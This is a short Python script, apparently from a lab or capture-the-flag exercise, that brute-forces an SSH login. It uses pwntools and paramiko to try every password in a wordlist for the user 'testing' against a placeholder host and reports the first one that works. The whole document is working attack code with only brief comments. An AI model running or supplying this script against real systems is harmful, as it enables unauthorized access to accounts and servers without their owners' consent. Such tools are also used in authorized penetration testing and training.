from pwn import *
import paramiko

host = "MachineIPaddress"
username = "testing"
attempts = 0

# opening a file and making it a password list to iterate over
with open("passwords.txt", "r") as password_list:
    # iterating over every password in the password list
    for password in password_list:
        # making each password on a single line
        password = password.strip("\n")
        
        # Error Handling (handling authentication errors)
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            # making ssh connection using pwn modules using a current password from the list
            response = ssh(host=host, user=username, password=password, timeout=1)
            # checking whether if the response is valid
            # if the password was valid print the correct password then close the connection
            if response.connected():
                print("[>] Valid password found: '{}'".format(password))
                response.close()
                break
            else:
                # close the connection at the end if the password was not correct then trying again
                response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
        attempts += 1